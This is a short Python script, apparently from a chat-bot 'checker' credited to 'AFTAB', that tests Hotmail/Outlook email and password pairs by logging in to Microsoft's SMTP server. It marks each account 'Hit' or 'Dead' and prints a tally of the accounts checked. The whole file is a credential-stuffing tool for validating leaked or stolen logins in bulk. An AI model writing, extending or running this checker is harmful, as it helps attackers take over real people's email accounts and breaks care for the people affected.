import smtplib
import traceback
import concurrent.futures
import time

def check_hotmail(email, password):
    try:
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email, password)
        server.quit()
        return "Hit", "Login Success✅"
    except smtplib.SMTPAuthenticationError:
        return "Dead", "Authentication failed🚫"
    except Exception as e:
        return "Dead", f"{str(e)}\n{traceback.format_exc()}"

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Accounts Checked - {total_accounts}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
